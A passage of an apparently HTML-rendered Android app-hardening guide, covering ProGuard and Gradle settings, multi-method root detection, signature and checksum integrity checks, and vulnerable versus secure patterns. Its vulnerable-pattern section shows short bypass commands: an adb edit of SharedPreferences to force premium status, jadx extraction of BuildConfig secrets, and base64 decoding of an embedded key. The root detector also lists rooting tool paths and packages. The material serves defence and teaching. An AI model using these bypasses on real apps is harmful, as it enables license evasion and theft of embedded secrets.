+<p>    public <init>(android.content.Context);</p>
+<p>    public <init>(android.content.Context, android.util.AttributeSet);</p>
+<p>    public <init>(android.content.Context, android.util.AttributeSet, int);</p>
+<p>}</p>
+
+<h1>==============================================================================</h1>
+<h1>LIBRARY COMPATIBILITY</h1>
+<h1>==============================================================================</h1>
+
+<h1>Retrofit</h1>
+<p>-keepattributes Signature</p>
+<p>-keepattributes Exceptions</p>
+<p>-keep class retrofit2.<em>* { </em>; }</p>
+
+<h1>Gson</h1>
+<p>-keep class com.google.gson.<em>* { </em>; }</p>
+<p>-keep class * implements com.google.gson.TypeAdapterFactory</p>
+<p>-keep class * implements com.google.gson.JsonSerializer</p>
+<p>-keep class * implements com.google.gson.JsonDeserializer</p>
+
+<h1>OkHttp</h1>
+<p>-keep class okhttp3.<em>* { </em>; }</p>
+<p>-keep interface okhttp3.<em>* { </em>; }</p>
+</code>`<code>
+
+<strong>build.gradle:</strong>
+</code>`<code>groovy
+<p>android {</p>
+<p>    buildTypes {</p>
+<p>        release {</p>
+<p>            // Enable obfuscation</p>
+<p>            minifyEnabled true</p>
+<p>            shrinkResources true</p>
+            
+<p>            // Use optimized ProGuard config</p>
+<p>            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), </p>
+<p>                          'proguard-rules.pro'</p>
+            
+<p>            // Disable debugging</p>
+<p>            debuggable false</p>
+<p>            jniDebuggable false</p>
+<p>            renderscriptDebuggable false</p>
+            
+<p>            // Remove default permissions</p>
+<p>            manifestPlaceholders = [usesCleartextTraffic: "false"]</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    // Split APKs (makes analysis harder)</p>
+<p>    splits {</p>
+<p>        abi {</p>
+<p>            enable true</p>
+<p>            reset()</p>
+<p>            include 'armeabi-v7a', 'arm64-v8a'</p>
+<p>            universalApk false</p>
+<p>        }</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Before Obfuscation:</strong>
+</code>`<code>java
+<p>package com.company.app.premium;</p>
+
+<p>public class PremiumValidator {</p>
+<p>    private static final String TAG = "PremiumValidator";</p>
+    
+<p>    public boolean validatePremiumStatus(String userId) {</p>
+<p>        Log.d(TAG, "Validating premium for user: " + userId);</p>
+<p>        SharedPreferences prefs = getSharedPreferences("premium", MODE_PRIVATE);</p>
+<p>        boolean isPremium = prefs.getBoolean("premium_status", false);</p>
+<p>        Log.d(TAG, "Premium status: " + isPremium);</p>
+<p>        return isPremium;</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>After Obfuscation (What attacker sees):</strong>
+</code>`<code>java
+<p>package obf;</p>
+
+<p>public class a {</p>
+<p>    // All logs removed</p>
+<p>    // Class name: a</p>
+<p>    // Method name: b</p>
+<p>    // Variable names: c, d, e</p>
+    
+<p>    public boolean b(String c) {</p>
+<p>        d e = f("p", 0);  // "premium" → "p"</p>
+<p>        return e.g("s", false);  // "premium_status" → "s"</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Benefits:</strong>
+<ul>
+<li>✅ Class/method/variable names meaningless</li>
+<li>✅ All debug logs removed (no sensitive data exposure)</li>
+<li>✅ Code structure harder to understand</li>
+<li>✅ Time to reverse engineer increased from minutes to hours</li>
+<li>✅ Automated tools less effective</li>
+</ul>
+
+<p>---</p>
+
+<h3>Example 3: Comprehensive Root/Jailbreak Detection</h3>
+
+<h4>✅ SECURE: Multi-Method Detection (Android)</h4>
+
+</code>`<code>kotlin
+<p>// RootDetector.kt - SECURE</p>
+<p>package com.company.app.security</p>
+
+<p>import android.content.Context</p>
+<p>import android.content.pm.PackageManager</p>
+<p>import java.io.File</p>
+
+<p>object RootDetector {</p>
+    
+<p>    /**</p>
+<ul>
+<li>Comprehensive root detection using multiple methods</li>
+<li>Returns true if device appears to be rooted</li>
+</ul>
+<p>     */</p>
+<p>    fun isDeviceRooted(context: Context): Boolean {</p>
+<p>        return checkSuBinary() ||</p>
+<p>               checkRootApps(context) ||</p>
+<p>               checkRWPaths() ||</p>
+<p>               checkDangerousProps() ||</p>
+<p>               checkBuildTags() ||</p>
+<p>               canExecuteSu()</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Method 1: Check for su binary in common locations</li>
+</ul>
+<p>     */</p>
+<p>    private fun checkSuBinary(): Boolean {</p>
+<p>        val suPaths = arrayOf(</p>
+<p>            "/system/app/Superuser.apk",</p>
+<p>            "/sbin/su",</p>
+<p>            "/system/bin/su",</p>
+<p>            "/system/xbin/su",</p>
+<p>            "/data/local/xbin/su",</p>
+<p>            "/data/local/bin/su",</p>
+<p>            "/system/sd/xbin/su",</p>
+<p>            "/system/bin/failsafe/su",</p>
+<p>            "/data/local/su",</p>
+<p>            "/su/bin/su",</p>
+<p>            "/su/bin",</p>
+<p>            "/system/xbin/which"</p>
+<p>        )</p>
+        
+<p>        return suPaths.any { File(it).exists() }</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Method 2: Check for root management apps</li>
+</ul>
+<p>     */</p>
+<p>    private fun checkRootApps(context: Context): Boolean {</p>
+<p>        val rootPackages = arrayOf(</p>
+<p>            "com.topjohnwu.magisk",              // Magisk</p>
+<p>            "com.noshufou.android.su",           // Superuser</p>
+<p>            "com.noshufou.android.su.elite",     // Superuser Elite</p>
+<p>            "eu.chainfire.supersu",              // SuperSU</p>
+<p>            "com.koushikdutta.superuser",        // Koushik Superuser</p>
+<p>            "com.thirdparty.superuser",          // Third-party Superuser</p>
+<p>            "com.yellowes.su",                   // YellowES</p>
+<p>            "com.koushikdutta.rommanager",       // ROM Manager</p>
+<p>            "com.koushikdutta.rommanager.license", // ROM Manager Premium</p>
+<p>            "com.dimonvideo.luckypatcher",       // Lucky Patcher</p>
+<p>            "com.chelpus.lackypatch",            // Lucky Patcher variant</p>
+<p>            "com.ramdroid.appquarantine"         // App Quarantine</p>
+<p>        )</p>
+        
+<p>        val pm = context.packageManager</p>
+<p>        return rootPackages.any {</p>
+<p>            try {</p>
+<p>                pm.getPackageInfo(it, 0)</p>
+<p>                true</p>
+<p>            } catch (e: PackageManager.NameNotFoundException) {</p>
+<p>                false</p>
+<p>            }</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Method 3: Check if system directories are writable</li>
+</ul>
+<p>     */</p>
+<p>    private fun checkRWPaths(): Boolean {</p>
+<p>        val paths = arrayOf(</p>
+<p>            "/system",</p>
+<p>            "/system/bin",</p>
+<p>            "/system/sbin",</p>
+<p>            "/system/xbin",</p>
+<p>            "/vendor/bin",</p>
+<p>            "/sbin",</p>
+<p>            "/etc"</p>
+<p>        )</p>
+        
+<p>        return paths.any { path -></p>
+<p>            val file = File(path)</p>
+<p>            file.exists() && file.canWrite()</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Method 4: Check for dangerous system properties</li>
+</ul>
+<p>     */</p>
+<p>    private fun checkDangerousProps(): Boolean {</p>
+<p>        val props = arrayOf(</p>
+<p>            "ro.debuggable" to "1",</p>
+<p>            "ro.secure" to "0"</p>
+<p>        )</p>
+        
+<p>        return props.any { (key, dangerousValue) -></p>
+<p>            getProp(key) == dangerousValue</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    private fun getProp(property: String): String? {</p>
+<p>        return try {</p>
+<p>            val process = Runtime.getRuntime().exec("getprop $property")</p>
+<p>            process.inputStream.bufferedReader().readLine()</p>
+<p>        } catch (e: Exception) {</p>
+<p>            null</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Method 5: Check build tags (test-keys = custom ROM)</li>
+</ul>
+<p>     */</p>
+<p>    private fun checkBuildTags(): Boolean {</p>
+<p>        val tags = android.os.Build.TAGS</p>
+<p>        return tags != null && tags.contains("test-keys")</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Method 6: Try to execute su command</li>
+</ul>
+<p>     */</p>
+<p>    private fun canExecuteSu(): Boolean {</p>
+<p>        return try {</p>
+<p>            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))</p>
+<p>            val result = process.waitFor()</p>
+<p>            result == 0</p>
+<p>        } catch (e: Exception) {</p>
+<p>            false</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Use Google SafetyNet for comprehensive check (recommended)</li>
+</ul>
+<p>     */</p>
+<p>    fun checkWithSafetyNet(context: Context, apiKey: String, callback: (Boolean) -> Unit) {</p>
+<p>        // Requires: implementation 'com.google.android.gms:play-services-safetynet:18.0.1'</p>
+        
+<p>        val client = SafetyNet.getClient(context)</p>
+<p>        val nonce = ByteArray(24).apply { </p>
+<p>            java.security.SecureRandom().nextBytes(this)</p>
+<p>        }</p>
+        
+<p>        client.attest(nonce, apiKey)</p>
+<p>            .addOnSuccessListener { response -></p>
+<p>                // Parse JWS result</p>
+<p>                val jwsResult = response.jwsResult</p>
+<p>                // Verify signature and check basicIntegrity and ctsProfileMatch</p>
+<p>                val isDeviceSafe = parseJwtAndValidate(jwsResult, apiKey)</p>
+<p>                callback(isDeviceSafe)</p>
+<p>            }</p>
+<p>            .addOnFailureListener { exception -></p>
+<p>                // SafetyNet check failed - assume compromised</p>
+<p>                callback(false)</p>
+<p>            }</p>
+<p>    }</p>
+    
+<p>    private fun parseJwtAndValidate(jwt: String, apiKey: String): Boolean {</p>
+<p>        // Implement JWT parsing and validation</p>
+<p>        // Check basicIntegrity and ctsProfileMatch fields</p>
+<p>        // Return true only if both pass</p>
+<p>        return false  // Simplified for example</p>
+<p>    }</p>
+<p>}</p>
+
+<p>// Usage in Application or MainActivity</p>
+<p>class SecureApplication : Application() {</p>
+<p>    override fun onCreate() {</p>
+<p>        super.onCreate()</p>
+        
+<p>        // Check for root</p>
+<p>        if (RootDetector.isDeviceRooted(this)) {</p>
+<p>            handleRootedDevice()</p>
+<p>        }</p>
+        
+<p>        // Also check with SafetyNet (more reliable)</p>
+<p>        RootDetector.checkWithSafetyNet(this, "YOUR_API_KEY") { isDeviceSafe -></p>
+<p>            if (!isDeviceSafe) {</p>
+<p>                handleCompromisedDevice()</p>
+<p>            }</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    private fun handleRootedDevice() {</p>
+<p>        // Option 1: Show warning and continue</p>
+<p>        showRootWarning()</p>
+        
+<p>        // Option 2: Disable sensitive features</p>
+<p>        disableSensitiveFeatures()</p>
+        
+<p>        // Option 3: Exit app (harsh but sometimes necessary)</p>
+<p>        // android.os.Process.killProcess(android.os.Process.myPid())</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Benefits:</strong>
+<ul>
+<li>✅ Multiple detection methods (harder to bypass all)</li>
+<li>✅ SafetyNet integration (Google's device integrity API)</li>
+<li>✅ Detects root management apps</li>
+<li>✅ Checks file system integrity</li>
+<li>✅ Graceful degradation (warning vs exit)</li>
+</ul>
+
+<p>---</p>
+
+<h3>Example 4: Signature Verification and Integrity Checks</h3>
+
+<h4>✅ SECURE: Runtime Integrity Verification</h4>
+
+</code>`<code>kotlin
+<p>// IntegrityChecker.kt - SECURE</p>
+<p>package com.company.app.security</p>
+
+<p>import android.content.Context</p>
+<p>import android.content.pm.PackageManager</p>
+<p>import android.content.pm.Signature</p>
+<p>import java.security.MessageDigest</p>
+<p>import java.util.zip.CRC32</p>
+
+<p>object IntegrityChecker {</p>
+    
+<p>    // Expected signature SHA-256 hash (from your release keystore)</p>
+<p>    // Get this by signing release build and calculating hash</p>
+<p>    private const val EXPECTED_SIGNATURE_HASH = </p>
+<p>        "a1b2c3d4e5f6789012345678901234567890123456789012345678901234567"</p>
+    
+<p>    /**</p>
+<ul>
+<li>Verify app hasn't been repackaged with different signature</li>
+<li>Call this in Application.onCreate()</li>
+</ul>
+<p>     */</p>
+<p>    fun verifyAppSignature(context: Context): Boolean {</p>
+<p>        return try {</p>
+<p>            val packageInfo = context.packageManager.getPackageInfo(</p>
+<p>                context.packageName,</p>
+<p>                PackageManager.GET_SIGNATURES</p>
+<p>            )</p>
+            
+<p>            for (signature in packageInfo.signatures) {</p>
+<p>                val hash = calculateSignatureHash(signature)</p>
+                
+<p>                if (hash == EXPECTED_SIGNATURE_HASH) {</p>
+<p>                    return true  // Legitimate signature</p>
+<p>                }</p>
+<p>            }</p>
+            
+<p>            false  // Signature doesn't match = repackaged</p>
+<p>        } catch (e: Exception) {</p>
+<p>            false  // Assume compromised if check fails</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    private fun calculateSignatureHash(signature: Signature): String {</p>
+<p>        val md = MessageDigest.getInstance("SHA-256")</p>
+<p>        md.update(signature.toByteArray())</p>
+<p>        return bytesToHex(md.digest())</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Verify APK file integrity</li>
+<li>Detects if APK has been modified</li>
+</ul>
+<p>     */</p>
+<p>    fun verifyApkIntegrity(context: Context): Boolean {</p>
+<p>        return try {</p>
+<p>            val apkPath = context.packageCodePath</p>
+<p>            val currentChecksum = calculateApkChecksum(apkPath)</p>
+            
+<p>            // Compare with expected checksum</p>
+<p>            // Store expected checksum securely (obfuscated in native code or fetched from server)</p>
+<p>            val expectedChecksum = getExpectedChecksum()</p>
+            
+<p>            currentChecksum == expectedChecksum</p>
+<p>        } catch (e: Exception) {</p>
+<p>            false</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    private fun calculateApkChecksum(apkPath: String): Long {</p>
+<p>        val file = File(apkPath)</p>
+<p>        val crc = CRC32()</p>
+        
+<p>        file.inputStream().use { input -></p>
+<p>            val buffer = ByteArray(8192)</p>
+<p>            var bytesRead = input.read(buffer)</p>
+<p>            while (bytesRead != -1) {</p>
+<p>                crc.update(buffer, 0, bytesRead)</p>
+<p>                bytesRead = input.read(buffer)</p>
+<p>            }</p>
+<p>        }</p>
+        
+<p>        return crc.value</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Verify classes.dex integrity</li>
+<li>Detects if code has been modified</li>
+</ul>
+<p>     */</p>
+<p>    fun verifyDexIntegrity(context: Context): Boolean {</p>
+<p>        return try {</p>
+<p>            // Calculate current DEX checksum</p>
+<p>            val currentChecksum = calculateDexChecksum(context)</p>
+            
+<p>            // Compare with expected</p>
+<p>            val expectedChecksum = getExpectedDexChecksum()</p>
+            
+<p>            currentChecksum == expectedChecksum</p>
+<p>        } catch (e: Exception) {</p>
+<p>            false</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    private fun calculateDexChecksum(context: Context): Long {</p>
+<p>        val apkPath = context.applicationInfo.sourceDir</p>
+<p>        var checksum: Long = 0</p>
+        
+<p>        java.util.zip.ZipFile(apkPath).use { zip -></p>
+<p>            val entry = zip.getEntry("classes.dex")</p>
+<p>            zip.getInputStream(entry).use { input -></p>
+<p>                val crc = CRC32()</p>
+<p>                val buffer = ByteArray(8192)</p>
+<p>                var read = input.read(buffer)</p>
+<p>                while (read != -1) {</p>
+<p>                    crc.update(buffer, 0, read)</p>
+<p>                    read = input.read(buffer)</p>
+<p>                }</p>
+<p>                checksum = crc.value</p>
+<p>            }</p>
+<p>        }</p>
+        
+<p>        return checksum</p>
+<p>    }</p>
+    
+<p>    // These would be obfuscated in native code or fetched from server</p>
+<p>    private external fun getExpectedChecksum(): Long</p>
+<p>    private external fun getExpectedDexChecksum(): Long</p>
+    
+<p>    private fun bytesToHex(bytes: ByteArray): String {</p>
+<p>        return bytes.joinToString("") { "%02x".format(it) }</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Continuous integrity monitoring</li>
+<li>Runs checks periodically in background</li>
+</ul>
+<p>     */</p>
+<p>    fun startContinuousMonitoring(context: Context) {</p>
+<p>        Thread {</p>
+<p>            while (true) {</p>
+<p>                // Check signature</p>
+<p>                if (!verifyAppSignature(context)) {</p>
+<p>                    handleTampering("Signature verification failed")</p>
+<p>                }</p>
+                
+<p>                // Check APK integrity</p>
+<p>                if (!verifyApkIntegrity(context)) {</p>
+<p>                    handleTampering("APK integrity check failed")</p>
+<p>                }</p>
+                
+<p>                // Check DEX integrity</p>
+<p>                if (!verifyDexIntegrity(context)) {</p>
+<p>                    handleTampering("DEX integrity check failed")</p>
+<p>                }</p>
+                
+<p>                // Sleep for 60 seconds</p>
+<p>                Thread.sleep(60000)</p>
+<p>            }</p>
+<p>        }.start()</p>
+<p>    }</p>
+    
+<p>    private fun handleTampering(reason: String) {</p>
+<p>        // App has been tampered with!</p>
+<p>        // Take action: log, alert server, exit, etc.</p>
+<p>        android.util.Log.e("Security", "Tampering detected: $reason")</p>
+<p>        android.os.Process.killProcess(android.os.Process.myPid())</p>
+<p>    }</p>
+<p>}</p>
+
+<p>// Usage</p>
+<p>class SecureApplication : Application() {</p>
+<p>    override fun onCreate() {</p>
+<p>        super.onCreate()</p>
+        
+<p>        // Verify integrity immediately</p>
+<p>        if (!IntegrityChecker.verifyAppSignature(this)) {</p>
+<p>            // App has been repackaged!</p>
+<p>            handleRepackagedApp()</p>
+<p>            return</p>
+<p>        }</p>
+        
+<p>        // Start continuous monitoring</p>
+<p>        IntegrityChecker.startContinuousMonitoring(this)</p>
+        
+<p>        // Continue normal initialization</p>
+<p>        initializeApp()</p>
+<p>    }</p>
+    
+<p>    private fun handleRepackagedApp() {</p>
+<p>        // Option 1: Exit immediately</p>
+<p>        android.os.Process.killProcess(android.os.Process.myPid())</p>
+        
+<p>        // Option 2: Show warning</p>
+<p>        // Toast.makeText(this, "Security violation detected", Toast.LENGTH_LONG).show()</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Benefits:</strong>
+<ul>
+<li>✅ Detects repackaging (signature mismatch)</li>
+<li>✅ Detects code tampering (checksum verification)</li>
+<li>✅ Continuous monitoring (periodic checks)</li>
+<li>✅ Multiple verification methods</li>
+<li>✅ Immediate response to tampering</li>
+</ul>
+
+<p>---</p>
+
+<h2>Common Vulnerable Patterns</h2>
+
+<h3>Pattern 1: Premium Features with Local Validation</h3>
+
+</code>`<code>kotlin
+<p>// VULNERABLE PATTERN</p>
+<p>class PremiumFeatures {</p>
+<p>    fun isPremium(): Boolean {</p>
+<p>        // ❌ Local check only - easily bypassed</p>
+<p>        return sharedPrefs.getBoolean("is_premium", false)</p>
+<p>    }</p>
+    
+<p>    fun unlockFeature() {</p>
+<p>        if (isPremium()) {</p>
+<p>            // Grant access</p>
+<p>        }</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Bypass:</strong>
+</code>`<code>bash
+<h1>Modify SharedPreferences</h1>
+<p>adb shell "echo '<boolean name=\"is_premium\" value=\"true\" />' >> /data/data/com.app/shared_prefs/prefs.xml"</p>
+</code>`<code>
+
+<h3>Pattern 2: API Keys in BuildConfig</h3>
+
+</code>`<code>kotlin
+<p>// VULNERABLE PATTERN</p>
+<p>object ApiConfig {</p>
+<p>    // ❌ BuildConfig values visible in decompiled code</p>
+<p>    val API_KEY = BuildConfig.STRIPE_API_KEY</p>
+<p>    val SECRET = BuildConfig.AWS_SECRET</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Extraction:</strong>
+</code>`<code>bash
+<h1>Decompile and find BuildConfig class</h1>
+<p>jadx app.apk</p>
+<p>cat sources/com/company/app/BuildConfig.java</p>
+<h1>All "secrets" exposed!</h1>
+</code>`<code>
+
+<h3>Pattern 3: Weak String Encoding</h3>
+
+</code>`<code>kotlin
+<p>// VULNERABLE PATTERN - Base64 is NOT encryption!</p>
+<p>object Config {</p>
+<p>    private const val ENCODED_KEY = "c2stbGl2ZV94eXoxMjM="  // Base64</p>
+    
+<p>    fun getApiKey(): String {</p>
+<p>        // ❌ Base64 decode is trivial</p>
+<p>        return String(Base64.decode(ENCODED_KEY, Base64.DEFAULT))</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Attack:</strong>
+</code>`<code>bash
+<p>$ echo "c2stbGl2ZV94eXoxMjM=" | base64 -d</p>
+<p>sk-live-xyz123  # Instantly decoded</p>
+</code>`<code>
+
+<p>---</p>
+
+<h2>Secure Implementation Patterns</h2>
+
+<h3>Pattern 1: Server-Side Validation + Local Obfuscation</h3>
+
+</code>`<code>kotlin
+<p>// SECURE PATTERN</p>
+<p>class PremiumManager {</p>
+    
+<p>    /**</p>
+<ul>
+<li>Always validate with server, cache for offline use</li>
+</ul>
+<p>     */</p>
+<p>    suspend fun isPremiumUser(userId: String): Boolean {</p>
+<p>        // Server validation (source of truth)</p>
+<p>        val serverResult = apiClient.checkPremiumStatus(userId)</p>
+        
+<p>        // Cache encrypted result</p>
+<p>        cacheEncryptedPremiumStatus(serverResult)</p>
+        
+<p>        return serverResult.isPremium</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Offline check uses encrypted cache</li>
+</ul>
+<p>     */</p>
+<p>    fun isPremiumUserOffline(): Boolean {</p>
+<p>        val encrypted = securePrefs.getString("premium_cache", null) ?: return false</p>
+<p>        val decrypted = SecureKeyManager.decrypt(encrypted)</p>
+        
+<p>        // Verify timestamp (cache expires after 24h)</p>
+<p>        val cache = Json.decodeFromString<PremiumCache>(decrypted)</p>
+<p>        return !cache.isExpired() && cache.isPremium</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<h3>Pattern 2: Native Code for Sensitive Logic</h3>
+
+</code>`<code>c
+<p>// native-lib.cpp - SECURE</p>
+<p>#include <jni.h></p>
+<p>#include <string></p>
+
+<p>// Store sensitive data in native code (harder to extract)</p>
+<p>static const char* encrypted_key = "\x8A\x3F\x2B...";  // XOR encrypted</p>
+
+<p>extern "C" JNIEXPORT jstring JNICALL</p>
+<p>Java_com_company_app_NativeSecure_getDecryptedKey(</p>
+<p>        JNIEnv* env,</p>
+<p>        jobject /<em> this </em>/) {</p>
+    
+<p>    // Decrypt key at runtime</p>
+<p>    std::string decrypted = xorDecrypt(encrypted_key);</p>
+    
+<p>    // Return to Java (use immediately, don't store)</p>
+<p>    return env->NewStringUTF(decrypted.c_str());</p>
+<p>}</p>
+</code>`<code>
+
+<h3>Pattern 3: Time-Based Key Rotation</h3>
+
+</code>`<code>kotlin
+<p>// SECURE PATTERN - Keys rotate periodically</p>
+<p>object ApiKeyManager {</p>
+    
+<p>    /**</p>
+<ul>
+<li>Fetch current API key from server</li>
+<li>Keys rotate every 24 hours</li>
+</ul>
+<p>     */</p>
+<p>    suspend fun getCurrentApiKey(): String {</p>
+<p>        // Check if cached key is still valid</p>
+<p>        val cached = getCachedKey()</p>
+<p>        if (cached != null && !cached.isExpired()) {</p>
+<p>            return cached.key</p>
+<p>        }</p>
+        
+<p>        // Fetch new key from server</p>
+<p>        val newKey = apiClient.fetchRotatingKey()</p>
+<p>        cacheKey(newKey)</p>
+        
+<p>        return newKey.key</p>
+<p>    }</p>
+    
+<p>    private data class CachedKey(</p>
+<p>        val key: String,</p>
+<p>        val expiresAt: Long</p>
+<p>    ) {</p>
+<p>        fun isExpired() = System.currentTimeMillis() > expiresAt</p>
+<p>    }</p>
+<p>}</p>
+</code>``
+
+<p>---</p>
+
+<h2>Comparison Tables</h2>
+
+<h3>Security Levels Comparison</h3>
+
+<p>| Aspect | Vulnerable | Basic Protection | Enhanced Protection | Maximum Protection |</p>
+<p>|--------|-----------|------------------|---------------------|-------------------|</p>
+<p>| <strong>Obfuscation</strong> | None | ProGuard (default) | ProGuard (custom rules) | DexGuard/Commercial |</p>
+<p>| <strong>Anti-Debug</strong> | None | Basic check | Multi-method | Native + runtime |</p>
+<p>| <strong>Root Detection</strong> | None | File check only | Multi-method | SafetyNet + custom |</p>
+<p>| <strong>Integrity Check</strong> | None | None | Signature verification | Continuous monitoring |</p>
+<p>| <strong>Key Storage</strong> | Hardcoded | Obfuscated | KeyStore/Keychain | Hardware-backed |</p>
+<p>| <strong>Certificate Pinning</strong> | None | None | OkHttp pinner | Custom validation |</p>
+<p>| <strong>Time to Reverse</strong> | 5 min | 1 hour | 1 day | 1+ weeks |</p>
+<p>| <strong>Cost</strong> | $0 | $0 | $0 | $3,000-20,000/year |</p>
+<p>| <strong>Suitable For</strong> | Learning | Low-risk apps | Most apps | Banking, Health, Premium |</p>
+
+<h3>Attack Resistance Comparison</h3>
+
+<p>| Attack Type | No Protection | ProGuard Only | Enhanced | Maximum |</p>
+<p>|-------------|--------------|---------------|----------|---------|</p>
+<p>| Static Analysis | ❌ Trivial | ⚠️ Easy | ✅ Hard | ✅ Very Hard |</p>
+<p>| Decompilation | ❌ Perfect reconstruction | ⚠️ Obfuscated names | ✅ Complex code | ✅ Virtualized |</p>
+<p>| String Extraction | ❌ All secrets visible | ❌ Most visible | ✅ Encrypted | ✅ Runtime decryption |</p>
+<p>| Debugging | ❌ Full access | ❌ Works | ⚠️ Detected | ✅ Blocked |</p>
+<p>| Hooking (Frida) | ❌ Complete control | ❌ Works | ⚠️ Detected | ✅ Multi-layer detection |</p>
+<p>| Repackaging | ❌ Undetected | ❌ Works | ⚠️ Detected | ✅ Immediate detection |</p>
+<p>| Root/Jailbreak | ❌ Full exploitation | ❌ Works | ⚠️ Warning shown | ✅ App exits |</p>
+
+<strong>Legend:</strong>  
+<p>❌ No protection  </p>
+<p>⚠️ Partial protection  </p>
+<p>✅ Good protection</p>
+
+<p>---</p>
+
+<h2>Conclusion</h2>
+
+<p>Binary protection is achieved through layered defenses. No single technique is sufficient, but combining multiple strategies significantly increases the cost and complexity of attacks.</p>
+
+<strong>Implementation Priority:</strong>
+<ol>
+<li><strong>Critical:</strong> Remove all hardcoded secrets, enable ProGuard, disable debugging</li>
+<li><strong>High:</strong> Implement certificate pinning, basic root detection, signature verification</li>
+<li><strong>Medium:</strong> Add anti-debugging, comprehensive root detection, integrity monitoring</li>
+<li><strong>Advanced:</strong> Commercial obfuscation, RASP, hardware-backed security</li>
+</ol>
+
+<p>Choose protection level based on your app's risk profile and budget. A free utility app needs basic protection; financial apps require maximum hardening.</p>
+
         </div>
     </div>
 </body>
